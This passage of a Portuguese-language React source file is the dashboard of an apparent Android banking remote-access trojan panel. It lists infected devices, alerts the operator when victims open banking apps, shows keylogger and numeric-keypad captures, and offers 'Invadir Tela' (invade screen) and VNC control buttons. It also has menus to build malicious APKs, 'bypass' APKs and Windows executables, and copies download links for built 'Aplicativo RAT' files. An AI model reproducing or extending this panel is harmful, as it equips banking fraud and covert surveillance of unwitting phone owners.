                className={`p-2 rounded-md border transition-all ${hideIps ? 'bg-[#ef4444]/15 border-[#3a3a44] text-[#ef4444]' : 'bg-[#121214] border-[#2a2a31] text-[#8b8b94] hover:text-[#e8e8ea]'}`}
                title={hideIps ? t('nav.show_ips') : t('nav.hide_ips')}
              >
                {hideIps ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
              <button
                type="button"
                onClick={() => loadDevices(false)}
                className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-all"
                title={t('nav.refresh')}
              >
                <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin text-[#ef4444]' : ''}`} />
              </button>
              <LanguageSelector />
              <div className="relative">
                <button
                  type="button"
                  onClick={() => setShowCreateMenu(!showCreateMenu)}
                  className="flex items-center gap-1.5 px-3 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-[11px] font-black uppercase tracking-wider transition-all"
                >
                  <span className="text-sm leading-none">+</span>
                  {t('nav.gen_apk')}
                  <span className="text-[9px] leading-none opacity-70"></span>
                </button>
                {showCreateMenu && (
                  <>
                    <div className="fixed inset-0 z-40" onClick={() => setShowCreateMenu(false)} />
                    <div className="absolute right-0 top-[calc(100%+6px)] z-50 w-60 bg-[#1a1a1e] border border-[#2a2a31] rounded-md shadow-[0_16px_40px_rgba(0,0,0,0.6)] p-1">
                      <button type="button" onClick={() => { setShowCreateMenu(false); navigate('/build-apk'); }} className="w-full flex items-center gap-2.5 px-2.5 py-2 rounded text-left text-[11px] font-bold text-[#e8e8ea] hover:bg-[#24242a]">
                        <Package className="w-4 h-4 text-[#ef4444]" /> {t('nav.gen_apk')}
                      </button>
                      <button type="button" onClick={() => { setShowCreateMenu(false); navigate('/apk-bypass'); }} className="w-full flex items-center gap-2.5 px-2.5 py-2 rounded text-left text-[11px] font-bold text-[#e8e8ea] hover:bg-[#24242a]">
                        <Zap className="w-4 h-4 text-[#ef4444]" /> {t('nav.gen_bypass')}
                      </button>
                      <button type="button" onClick={() => { setShowCreateMenu(false); navigate('/win-builder'); }} className="w-full flex items-center gap-2.5 px-2.5 py-2 rounded text-left text-[11px] font-bold text-[#e8e8ea] hover:bg-[#24242a]">
                        <Monitor className="w-4 h-4 text-[#ef4444]" /> {t('nav.gen_exe')}
                      </button>
                      <div className="my-1 h-px bg-[#2a2a31]" />
                      <button type="button" onClick={() => { setShowCreateMenu(false); setShowMyAppsModal(true); loadBuilds(); }} className="w-full flex items-center gap-2.5 px-2.5 py-2 rounded text-left text-[11px] font-bold text-[#e8e8ea] hover:bg-[#24242a]">
                        <Smartphone className="w-4 h-4 text-[#8b8b94]" /> {t('nav.my_apps')}
                      </button>
                    </div>
                  </>
                )}
              </div>
              <button type="button" onClick={() => { loadUserProfile(); setShowProfileModal(true); }} className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-all" title={t('nav.profile')}>
                <User className="w-4 h-4" />
              </button>
              <button type="button" onClick={() => setIsSidebarOpen(!isSidebarOpen)} className={`p-2 rounded-md border transition-all ${isSidebarOpen ? 'bg-[#ef4444]/20 border-[#3a3a44] text-[#ef4444]' : 'bg-[#121214] border-[#2a2a31] text-[#8b8b94] hover:text-[#e8e8ea]'}`} title={t('nav.radar')}>
                <Bell className="w-4 h-4" />
              </button>
            </div>
          </div>
        </header>

        <div className="flex-1 flex overflow-hidden">
          <main className="flex-1 p-4 sm:p-6 overflow-auto">
          {/*  PAINEL PREMIUM DE ESTATÍSTICAS (PING SERVIDOR, APARELHOS E APPS GUARDADOS) */}
          <div className="mb-4 grid grid-cols-1 sm:grid-cols-3 gap-3">
            {/*  BADGE 1: PING SERVIDOR */}
            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-[#2a2a31]/40 hover:border-[#4a4a56] rounded-md p-3 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.18)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.3)] group overflow-hidden">
              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-[#ef4444]/10 rounded-full blur-2xl group-hover:bg-[#ef4444]/20 transition-all pointer-events-none"></div>
              <div className="flex items-center gap-3.5 relative z-10">
                <div className="p-2 rounded-md bg-gradient-to-br from-[#ef4444]/25 to-[#ef4444]/30 border border-[#3a3a44]/60 text-[#ef4444] shadow-[0_0_15px_rgba(239,68,68,0.4)] group-hover:scale-110 transition-transform">
                  <Wifi className="w-4 h-4 text-[#ef4444] animate-pulse" />
                </div>
                <div>
                  <span className="text-[11px] font-black text-[#ef4444]/80 uppercase font-mono tracking-widest block">{t('stats.ping_server')}</span>
                  <div className="flex items-baseline gap-1.5 mt-0.5">
                    <span className="text-xl font-black text-white font-mono tracking-tight group-hover:text-[#e8e8ea] transition-colors">{serverPing}</span>
                    <span className="text-xs text-[#ef4444] font-mono font-bold">ms</span>
                  </div>
                </div>
              </div>
              <span className="text-[10px] text-[#ef4444] font-mono font-black px-2.5 py-1 rounded-full bg-[#121214]/80 border border-[#2a2a31]/40 shadow-[0_0_10px_rgba(239,68,68,0.3)] flex items-center gap-1.5 relative z-10">
                <span className="w-2 h-2 rounded-full bg-[#ef4444] animate-ping"></span>
                {t('nav.online')}
              </span>
            </div>

            {/*  BADGE 2: APARELHOS / DISPOSITIVOS (AZUL MODERNO) */}
            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-[#2a2a31]/50 hover:border-[#4a4a56] rounded-md p-3 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.22)] flex flex-col justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.4)] group overflow-hidden">
              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-[#ef4444]/15 rounded-full blur-2xl group-hover:bg-[#ef4444]/25 transition-all pointer-events-none"></div>
              <div className="flex items-center justify-between relative z-10">
                <div className="flex items-center gap-3.5">
                  <div className="p-2 rounded-md bg-gradient-to-br from-[#ef4444]/30 to-[#ef4444]/40 border border-[#3a3a44]/70 text-[#e8e8ea] shadow-[0_0_15px_rgba(239,68,68,0.5)] group-hover:scale-110 transition-transform">
                    <Smartphone className="w-4 h-4 text-[#ef4444] animate-pulse" />
                  </div>
                  <div>
                    <span className="text-[11px] font-black text-[#ef4444]/90 uppercase font-mono tracking-widest block">{t('stats.devices')}</span>
                    <div className="flex items-baseline gap-2 mt-0.5">
                      <span className="text-xl font-black text-white font-mono tracking-tight">{clientes.length}</span>
                      <span className="text-xs text-[#ef4444]/70 font-mono font-bold">{t('stats.registered')}</span>
                    </div>
                  </div>
                </div>
                <span className="text-[10px] font-mono text-[#e8e8ea] font-black px-3 py-1 rounded-full bg-[#121214]/90 border border-[#3a3a44]/60 shadow-[0_0_12px_rgba(239,68,68,0.35)]">
                  {onlineCount} ON
                </span>
              </div>

              {/* Visual Progress bar ratio of Online devices in Electric Blue */}
              <div className="mt-2.5 w-full bg-[#121214]/90 h-1 rounded-full overflow-hidden border border-[#1a1a1e]/50 relative z-10">
                <div 
                  className="h-full bg-gradient-to-r from-[#ef4444] via-[#f87171] to-[#fca5a5] rounded-full transition-all duration-500 shadow-[0_0_12px_rgba(239,68,68,0.9)]"
                  style={{ width: clientes.length > 0 ? `${(onlineCount / clientes.length) * 100}%` : '0%' }}
                ></div>
              </div>
            </div>

            {/*  BADGE 3: APPS GUARDADOS (AZUL MODERNO) */}
            <div className="relative bg-gradient-to-br from-[#330b03]/90 via-[#240703]/90 to-[#180403]/90 border border-[#2a2a31]/50 hover:border-[#4a4a56] rounded-md p-3 backdrop-blur-2xl shadow-[0_0_25px_rgba(239,68,68,0.22)] flex items-center justify-between transition-all duration-300 hover:scale-[1.02] hover:shadow-[0_0_35px_rgba(239,68,68,0.4)] group overflow-hidden">
              <div className="absolute -right-6 -bottom-6 w-24 h-24 bg-[#ef4444]/15 rounded-full blur-2xl group-hover:bg-[#ef4444]/25 transition-all pointer-events-none"></div>
              <div className="flex items-center gap-3.5 relative z-10">
                <div className="p-2 rounded-md bg-gradient-to-br from-[#ef4444]/30 via-[#f87171]/30 to-[#f87171]/30 border border-[#3a3a44]/70 text-[#e8e8ea] shadow-[0_0_15px_rgba(239,68,68,0.5)] group-hover:scale-110 transition-transform">
                  <Package className="w-5 h-5 text-[#ef4444]" />
                </div>
                <div>
                  <span className="text-[11px] font-black text-[#ef4444]/90 uppercase font-mono tracking-widest block">{t('stats.stored_apps')}</span>
                  <div className="flex items-baseline gap-1.5 mt-0.5">
                    <span className="text-xl font-black text-white font-mono tracking-tight">{builds.length}</span>
                    <span className="text-xs text-[#ef4444]/70 font-mono font-bold">APKs</span>
                  </div>
                </div>
              </div>
              <button
                type="button"
                onClick={() => setShowMyAppsModal(true)}
                className="px-3.5 py-1.5 rounded-md bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#f87171] hover:from-[#f87171] hover:to-[#fca5a5] text-[#10120a] font-black font-mono text-xs transition-all hover:scale-105 active:scale-95 shadow-[0_0_15px_rgba(239,68,68,0.5)] border border-[#4a4a56] flex items-center gap-1 relative z-10"
                title="Ver Central de Apps Guardados"
              >
                <span>Meus Apps</span>
                <span className="text-sm"></span>
              </button>
            </div>
          </div>
          
          {/*  BARRA SLIM DE ALERTAS BANCÁRIOS (CLEAN & ELEGANT) */}
          {(() => {
            const activeCount = alerts.filter(a => a.status === 'open').length;
            
            if (alerts.length === 0) {
              return (
                <div className="mb-5 px-4 py-2.5 bg-[#1e0603]/80 border border-[#2a2a31]/20 rounded-md flex items-center justify-between backdrop-blur-md">
                  <div className="flex items-center space-x-2.5">
                    <span className="w-2 h-2 rounded-full bg-[#ef4444] animate-pulse"></span>
                    <span className="text-xs font-bold text-[#e8e8ea]/80 font-mono">Alertas Financeiros:</span>
                    <span className="text-xs text-[#ef4444]/50">Nenhum aplicativo bancário em execução no momento</span>
                  </div>
                  <span className="text-[10px] text-[#ef4444] font-mono font-bold px-2 py-0.5 rounded bg-[#121214]/50 border border-[#2a2a31]/20">
                    SISTEMA ATIVO
                  </span>
                </div>
              );
            }

            return (
              <div className="mb-5 space-y-2">
                <div className="flex items-center justify-between px-1">
                  <span className="text-xs font-bold text-[#ef4444] font-mono flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-[#ef4444] animate-ping"></span>
                    Alertas Bancários Detectados ({alerts.length})
                  </span>
                  {activeCount > 0 && (
                    <span className="text-[10px] font-bold text-[#ef4444] font-mono uppercase bg-[#121214]/60 px-2.5 py-0.5 rounded-md border border-[#2a2a31]/30">
                       {activeCount} Banco(s) em foco
                    </span>
                  )}
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
                  {alerts.map((item, idx) => {
                    const isOpen = item.status === 'open';
                    
                    return (
                      <div
                        key={idx}
                        onClick={() => navigate(`/device/${item.deviceId}`)}
                        className={`p-3 rounded-md border transition-all cursor-pointer flex items-center justify-between ${
                          isOpen
                            ? 'bg-[#121214]/40 border-[#2a2a31]/50 text-[#e8e8ea] hover:border-[#3a3a44] shadow-md'
                            : 'bg-[#121214]/30 border-[#2a2a31]/20 text-[#ef4444]/70 hover:border-[#2a2a31]/40'
                        }`}
                      >
                        <div className="flex items-center space-x-3 min-w-0">
                          <BankIcon pkg={item.bankPackage} iconB64={item.iconB64} name={item.bankName} size={32} />
                          <div className="min-w-0">
                            <span className="text-xs font-bold truncate block font-mono text-white">{item.bankName}</span>
                            <span className="text-[10px] text-[#ef4444]/50 truncate block font-mono">{item.deviceModel}</span>
                          </div>
                        </div>
                        
                        <div className="flex items-center space-x-2 flex-shrink-0">
                          {isOpen ? (
                            <span className="px-2.5 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white font-bold text-[10px] rounded-md font-mono uppercase transition-all shadow">
                              Acessar
                            </span>
                          ) : (
                            <span className="text-[9px] font-mono text-[#ef4444]/40 uppercase">
                              Fechado
                            </span>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            );
          })()}

          <div id="tour-device-table">
            <DeviceTable
              clientes={clientes}
              loading={initialLoading}
              onRowClick={handleRowClick}
              onRowContextMenu={(e, cliente) => openMenu(e, cliente)}
              onDeleteDevice={handleDeleteDevice}
              onCreateApk={() => navigate('/build-apk')}
              onOpenVnc={handleOpenVnc}
            />
          </div>
        </main>

        {/* HUD DE NOTIFICAÇÕES LATERAIS */}
        {isSidebarOpen && !isMobile && (
          <div id="tour-banking-radar" className="w-80 border-l border-[#2a2a31]/20 bg-[#190403]/40 backdrop-blur-md flex flex-col flex-shrink-0 text-slate-300 relative transition-all duration-300 ease-in-out shadow-[-10px_0_30px_rgba(0,0,0,0.5)]">
            <div className="p-4 border-b border-[#2a2a31]/20 flex items-center justify-between">
              <div className="flex items-center gap-2.5">
                <Activity className="w-4 h-4 text-[#ef4444] animate-pulse" />
                <span className="text-xs font-black tracking-widest text-[#ef4444] font-mono">RADAR DE ALERTAS</span>
              </div>
              <div className="flex items-center gap-1.5">
                <button
                  onClick={() => setSoundEnabled(!soundEnabled)}
                  className={`p-1.5 rounded-md transition-colors ${soundEnabled ? 'text-[#ef4444] bg-[#ef4444]/10 hover:bg-[#ef4444]/20' : 'text-[#8b8b94] hover:bg-[#24242a]'}`}
                  title={soundEnabled ? "Mudar para Silencioso" : "Ativar Som"}
                >
                  {soundEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
                </button>
                <button
                  onClick={() => setActivityLog([])}
                  className="p-1.5 text-slate-400 hover:text-[#ef4444] hover:bg-[#ef4444]/10 rounded-md transition-colors"
                  title="Limpar Feed"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            </div>
            
            <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
              {activityLog.length === 0 ? (
                <div className="h-full flex flex-col items-center justify-center text-center p-4 text-[#8b8b94] space-y-3">
                  <div className="p-3 rounded-md bg-[#ef4444]/10 border border-[#2a2a31]/20 text-[#ef4444]">
                    <Sparkles className="w-7 h-7 animate-pulse" />
                  </div>
                  <p className="text-xs font-bold text-slate-300">Sem atividades recentes</p>
                  <p className="text-[11px] text-[#8b8b94] leading-relaxed">Aparelhos conectados ou acessos a bancos aparecerão aqui em tempo real.</p>
                </div>

              ) : (
                activityLog.map((event) => {
                  const isBank = event.type === 'bank_open' || event.type === 'bank_close';
                  const isNumeric = event.type === 'numeric_keypad' || event.title.includes('NUMÉRICO');
                  const isKeylog = event.type === 'keylog' || event.title.includes('TECLADO');
                  const isOpen = event.type === 'bank_open';
                  const isOnline = event.type === 'device_online';
                  const isOffline = event.type === 'device_offline';
                  
                  let cardStyle = "bg-[#2b0903]/40 border border-[#24242a]/80";
                  
                  if (isOpen) {
                    cardStyle = "bg-[#180a0f]/90 border-2 border-[#2a2a31]/60 shadow-[0_0_15px_rgba(239,68,68,0.15)]";
                  } else if (isNumeric) {
                    cardStyle = "bg-[#1c1809]/90 border-2 border-amber-400/80 shadow-[0_0_15px_rgba(245,158,11,0.2)]";
                  } else if (isKeylog) {
                    cardStyle = "bg-[#280a03]/90 border border-[#2a2a31]/50 shadow-[0_0_12px_rgba(239,68,68,0.15)]";
                  } else if (isOnline) {
                    cardStyle = "bg-[#280a03]/90 border border-[#2a2a31]/40 shadow-[0_0_12px_rgba(239,68,68,0.1)]";
                  } else if (isOffline) {
                    cardStyle = "bg-[#1a140c]/80 border border-amber-500/30";
                  }
                  
                  return (
                    <div 
                      key={event.id}
                      className={`p-3 rounded-md transition-all duration-300 relative overflow-hidden ${cardStyle}`}
                    >
                      {isOpen && (
                        <div className="absolute inset-0 bg-gradient-to-r from-[#ef4444]/5 to-transparent pointer-events-none"></div>
                      )}
                      
                      <div className="flex items-start gap-2.5 relative z-10">
                        {isBank ? (
                          <div className="flex-shrink-0 mt-0.5">
                            <BankIcon pkg={event.bankPackage || ''} iconB64={event.iconB64} size={30} />
                          </div>
                        ) : (
                          <div className="w-[30px] h-[30px] rounded-md bg-[#121214] border border-slate-850 flex items-center justify-center flex-shrink-0 mt-0.5">
                            <Smartphone className={`w-4 h-4 ${isOnline ? 'text-[#ef4444] animate-bounce' : 'text-amber-500'}`} />
                          </div>
                        )}
                        
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between gap-1">
                            <span className="font-mono text-[9px] text-[#8b8b94] font-bold uppercase truncate">{event.deviceModel}</span>
                            <span className="text-[8px] text-[#8b8b94] font-mono flex-shrink-0">{event.timestamp}</span>
                          </div>
                          <h4 className="text-[11px] font-black text-white mt-0.5 uppercase tracking-wide truncate">
                            {event.title}
                          </h4>
                          <p className="text-[10px] text-slate-400 leading-normal mt-0.5">
                            {event.description}
                          </p>
                          
                          {(isOpen || isOnline) && (
                            <button
                              onClick={() => navigate(`/device/${event.deviceId}`)}
                              className={`mt-2 w-full py-1 rounded text-[9px] font-black uppercase tracking-wider transition-all duration-200 ${
                                isOpen 
                                  ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] shadow-[0_0_8px_rgba(239,68,68,0.2)]'
                                  : 'bg-slate-850 hover:bg-[#24242a] text-slate-300'
                              }`}
                            >
                              {isOpen ? ' Invadir Tela' : ' Controlar'}
                            </button>
                          )}
                        </div>
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          </div>
        )}
        </div>
      </div>

      <ContextMenu
        visible={menu.visible}
        x={menu.x}
        y={menu.y}
        cliente={menu.cliente}
        onClose={closeMenu}
        onRename={(cliente) => {
          const name = prompt("Digite o novo nome para o aparelho:", cliente.customName || cliente.model);
          if (name !== null) {
            devicesAPI.rename(cliente.deviceId, name)
              .then(() => {
                loadDevices(false);
              })
              .catch((err) => alert("Erro ao renomear dispositivo: " + (err.response?.data?.detail || err.message)));
          }
        }}
        onDelete={handleDeleteDevice}
      />

      {/*  TOAST NOTIFICATIONS EM TEMPO REAL (Canto Superior Direito) */}
      <div className="fixed top-4 right-4 z-50 pointer-events-none space-y-3 max-w-sm w-full">
        {toasts.map((t) => {
          const isOpen = t.type === 'open';
          return (
            <div
              key={t.id}
              className={`pointer-events-auto p-4 rounded-md shadow-[0_10px_30px_rgba(0,0,0,0.5)] border backdrop-blur-xl flex items-center space-x-3.5 transition-all transform duration-300 animate-pulse-once ${
                isOpen 
                  ? 'bg-[#121214]/80 border-[#2a2a31]/50 shadow-[0_0_20px_rgba(239,68,68,0.2)]' 
                  : 'bg-[#121214]/90 border-[#2a2a31]/50'
              }`}
            >
              <div className="flex-shrink-0">
                <BankIcon pkg={t.bankPkg} iconB64={t.iconB64} size={38} />
              </div>
              <div className="flex-1 min-w-0">
                <h4 className={`text-[10px] font-black uppercase tracking-widest ${isOpen ? 'text-[#ef4444]' : 'text-slate-400'}`}>
                  {t.title}
                </h4>
                <p className="text-xs text-white font-bold mt-0.5">
                  {t.body}
                </p>
              </div>
            </div>
          );
        })}
      </div>

      {/*  MODAL DE APKS GERADOS (MEUS APPS FUTURISTA & MODERNO) */}
      {showMyAppsModal && (
        <div className="fixed inset-0 bg-black/85 flex items-center justify-center z-50 p-4 backdrop-blur-md animate-fade-in" onClick={() => setShowMyAppsModal(false)}>
          <div 
            className="bg-gradient-to-b from-[#2b0803] via-[#1f0603] to-[#0a0a0b] border border-[#2a2a31]/40 rounded-3xl max-w-4xl w-full p-6 shadow-[0_0_60px_rgba(239,68,68,0.25)] backdrop-blur-2xl relative max-h-[85vh] flex flex-col overflow-hidden animate-scale-up select-none"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Blueprint Grid Background Accent */}
            <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_0%,rgba(239,68,68,0.15),transparent_70%)] pointer-events-none"></div>
            
            <button 
              onClick={() => setShowMyAppsModal(false)}
              className="absolute top-5 right-5 p-2 text-slate-400 hover:text-white bg-[#121214]/80 hover:bg-[#ef4444]/80 rounded-md transition-all border border-[#24242a] z-20 cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="relative z-10 flex items-center justify-between border-b border-[#2a2a31]/20 pb-4 mb-4">
              <div className="flex items-center space-x-3">
                <div className="p-3 bg-gradient-to-br from-[#ef4444]/20 to-[#ef4444]/20 rounded-md border border-[#3a3a44]/40 shadow-[0_0_15px_rgba(239,68,68,0.3)]">
                  <Smartphone className="w-6 h-6 text-[#ef4444] animate-pulse" />
                </div>
                <div>
                  <h3 className="text-base font-black uppercase text-white tracking-widest font-mono flex items-center gap-2">
                     MEUS APLICATIVOS GERADOS
                    <span className="px-2 py-0.5 bg-[#ef4444]/20 text-[#ef4444] text-[10px] rounded-full border border-[#3a3a44]/30">
                      {builds.length} APKs
                    </span>
                  </h3>
                  <p className="text-xs text-slate-400 mt-0.5 font-sans">
                    Histórico de APKs compilados prontos para download seguro e cópia de link
                  </p>
                </div>
              </div>
              
              <button
                type="button"
                onClick={loadBuilds}
                className="mr-12 px-3.5 py-1.5 bg-gradient-to-r from-[#ef4444]/30 to-[#ef4444]/30 hover:from-[#ef4444]/40 hover:to-[#ef4444]/40 border border-[#3a3a44]/40 rounded-md text-xs font-black uppercase text-[#e8e8ea] transition-all shadow-[0_0_12px_rgba(239,68,68,0.2)] flex items-center gap-1.5 cursor-pointer font-mono"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${buildsLoading ? 'animate-spin' : ''}`} />
                Atualizar
              </button>
            </div>

            <div className="relative z-10 flex-1 overflow-y-auto pr-1">
              {buildsLoading && builds.length === 0 ? (
                <div className="py-20 flex flex-col items-center justify-center text-center space-y-3">
                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-[#3a3a44] shadow-[0_0_15px_rgba(239,68,68,0.5)]"></div>
                  <span className="text-xs text-[#ef4444] font-mono">Carregando compilações de APKs...</span>
                </div>
              ) : builds.length === 0 ? (
                <div className="py-16 text-center text-slate-400 text-xs bg-slate-950/60 rounded-md border border-[#24242a]/80 p-6">
                  <div className="text-4xl mb-2"></div>
                  <p className="font-bold text-slate-300 text-sm">Nenhum aplicativo gerado ainda</p>
                  <p className="text-xs text-[#8b8b94] mt-1">Os APKs compilados no APK Studio aparecerão listados aqui com suporte a download direto.</p>
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pb-4">
                  {builds.map((build) => {
                    const dateFormatted = build.createdAt 
                      ? new Date(build.createdAt).toLocaleString('pt-BR', {
                          day: '2-digit',
                          month: '2-digit',
                          year: 'numeric',
                          hour: '2-digit',
                          minute: '2-digit'
                        })
                      : '';
                    
                    const cleanAppName = build.appName ? build.appName.replace(/\s+/g, '-').toLowerCase() : 'app';
                    const fallbackFilename = `studio-user${build.ownerId || 1}-${cleanAppName}-${build.build_id}.apk`; 
                    const apkFilename = build.filename || fallbackFilename;
                    const downloadPath = build.download_url || `/api/apk-studio/download/${apkFilename}`;
                    const token = localStorage.getItem('admin_token') || localStorage.getItem('token') || '';
                    const fullDownloadUrl = `${window.location.origin}${downloadPath}${downloadPath.includes('?') ? '&' : '?'}token=${token}`;
                    
                    // Formata tamanho do arquivo
                    const fileSizeFormatted = build.size 
                      ? (build.size / (1024 * 1024)).toFixed(2) + ' MB'
                      : '2.65 MB';
                    
                    return (
                      <div 
                        key={build.id || build.build_id}
                        className="group bg-gradient-to-b from-[#2e0903]/90 to-[#1e0603]/90 hover:from-[#470e04]/90 hover:to-[#300903]/90 border border-[#2a2a31]/25 hover:border-[#3a3a44]/60 rounded-md p-4 transition-all duration-300 shadow-lg hover:shadow-[0_0_25px_rgba(239,68,68,0.25)] relative overflow-hidden flex flex-col justify-between"
                      >
                        <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-[#ef4444] via-[#f87171] to-teal-400 opacity-70 group-hover:opacity-100 transition-opacity"></div>
                        
                        <div>
                          <div className="flex items-center justify-between mb-2">
                            <span className="px-2.5 py-0.5 bg-[#121214]/80 text-[#ef4444] border border-[#2a2a31]/30 rounded-md text-[9px] font-mono font-bold">
                              ID: {build.build_id}
                            </span>
                            <span className="text-[10px] text-slate-400 font-mono">
                               {dateFormatted}
                            </span>
                          </div>
                          
                          <div className="flex items-center space-x-3 my-2">
                            <div className="p-2.5 bg-gradient-to-br from-[#ef4444] to-[#ef4444] rounded-md text-[#10120a] shadow-[0_0_12px_rgba(239,68,68,0.4)]">
                              <Smartphone className="w-5 h-5" />
                            </div>
                            <div className="flex-1 min-w-0">
                              <h4 className="text-sm font-black text-white uppercase tracking-wide truncate">
                                {build.appName || 'Aplicativo RAT'}
                              </h4>
                              <p className="text-[10px] text-[#ef4444]/80 truncate font-mono mt-0.5">
                                 {apkFilename}
                              </p>
                            </div>
                          </div>
                        </div>
                        
                        <div className="flex items-center justify-between mt-3 pt-3 border-t border-[#2a2a31]/15">
                          <div className="flex items-center space-x-2">
                            <span className="text-[10px] font-bold text-emerald-400 flex items-center gap-1 bg-emerald-950/60 border border-emerald-500/30 px-2 py-0.5 rounded-full">
                              <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                              PRONTO
                            </span>
                            <span className="text-[10px] font-mono text-slate-400">
                              ({fileSizeFormatted})
                            </span>
                          </div>

                          <div className="flex items-center space-x-1.5">
                            <button
                              onClick={() => {
                                navigator.clipboard.writeText(fullDownloadUrl);
                                alert(' Link de download copiado para a área de transferência!');
                              }}
                              className="px-2 py-1.5 bg-[#24242a] hover:bg-[#2a2a31] text-[#ef4444] rounded-md text-[10px] font-bold transition-all border border-[#2a2a31]/20 flex items-center gap-1"
                              title="Copiar Link de Download"
                            >
                              <Copy className="w-3 h-3" />
                              Link
                            </button>

                            <button
                              onClick={() => {
                                try {
                                  window.open(fullDownloadUrl, '_blank');
                                } catch (err) {
                                  console.error('Erro ao abrir download:', err);
                                  window.location.href = fullDownloadUrl;
                                }
                              }}
                              className="px-3 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-md text-xs font-black uppercase tracking-wider shadow-[0_0_12px_rgba(16,185,129,0.4)] border border-emerald-400/40 transition-all flex items-center gap-1.5 cursor-pointer"
                            >
                              <Download className="w-3.5 h-3.5" />
                              Baixar APK
                            </button>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
      {/*  MODAL DE MEU PERFIL */}
      {showProfileModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4 animate-fade-in" onClick={() => setShowProfileModal(false)}>
          <div 
            className="bg-[#200703]/95 border border-[#2a2a31]/30 rounded-md max-w-md w-full p-6 shadow-[0_0_50px_rgba(239,68,68,0.15)] backdrop-blur-xl relative flex flex-col animate-scale-up"
            onClick={(e) => e.stopPropagation()}
          >
            <button 
              onClick={() => setShowProfileModal(false)}
              className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-white hover:bg-[#24242a]/50 rounded-md transition-colors z-20"
            >
              <X className="w-5 h-5" />
            </button>
            <div className="flex items-center space-x-3 border-b border-[#2a2a31]/10 pb-4 mb-4">
              <div className="p-2 bg-[#ef4444]/10 rounded-md border border-[#2a2a31]/20">
                <User className="w-5 h-5 text-[#ef4444]" />
              </div>
              <div>
                <h3 className="text-sm font-black uppercase text-[#ef4444] tracking-widest font-mono">
                   Configurações do Meu Perfil
                </h3>
                <p className="text-[10px] text-[#8b8b94] mt-0.5">
                  Atualize suas credenciais de acesso ao painel
                </p>
              </div>
            </div>
            <form onSubmit={handleSaveProfile} className="space-y-4">
              {profileError && (
                <div className="p-3 bg-[#ef4444]/10 border border-[#2a2a31]/20 text-[#ef4444] text-xs rounded-md font-medium">
                  ️ {profileError}
                </div>
              )}
              {profileSuccess && (
                <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs rounded-md font-medium">
                   {profileSuccess}
                </div>
              )}
              <div>
                <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1.5 tracking-wider font-mono">Nome de Usuário</label>
                <input 
                  type="text" 
                  value={profileUsername} 
                  onChange={(e) => setProfileUsername(e.target.value)} 
                  required
                  className="w-full bg-slate-950 border border-[#24242a] focus:border-[#2a2a31]/50 focus:ring-1 focus:ring-[#ef4444]/35 rounded-md px-4 py-2 text-sm text-white transition-all outline-none"
                />
              </div>
              <div>
                <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1.5 tracking-wider font-mono">E-mail</label>
                <input 
                  type="email" 
                  value={profileEmail} 
                  onChange={(e) => setProfileEmail(e.target.value)} 
                  required
                  className="w-full bg-slate-950 border border-[#24242a] focus:border-[#2a2a31]/50 focus:ring-1 focus:ring-[#ef4444]/35 rounded-md px-4 py-2 text-sm text-white transition-all outline-none"
                />
              </div>
              <div className="border-t border-[#121214]/80 pt-3">
                <p className="text-[10px] text-[#8b8b94] font-medium mb-3">Deseja alterar a senha? Deixe em branco se não quiser mudar.</p>
                
                <div className="space-y-3">
                  <div>
                    <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1.5 tracking-wider font-mono">Nova Senha</label>
                    <input 
                      type="password" 
                      value={profilePassword} 
                      onChange={(e) => setProfilePassword(e.target.value)} 
                      placeholder=""
                      className="w-full bg-slate-950 border border-[#24242a] focus:border-[#2a2a31]/50 focus:ring-1 focus:ring-[#ef4444]/35 rounded-md px-4 py-2 text-sm text-white transition-all outline-none placeholder:text-[#24242a]"
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1.5 tracking-wider font-mono">Confirmar Nova Senha</label>
                    <input 
